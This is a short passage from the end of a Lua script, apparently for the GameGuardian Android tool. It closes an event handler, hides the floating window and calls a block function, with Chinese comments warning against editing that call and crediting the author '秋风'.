		if 显示==0 then
			proo()
		end
	end
end):start()
jm1 : setBackground(slcta )
gg.setVisible(false )
luajava.setFloatingWindowHide(true )
---bloc不要动 动了脚本功能会失效
bloc = luajava.getBlock()
bloc("join" )
--by秋风
            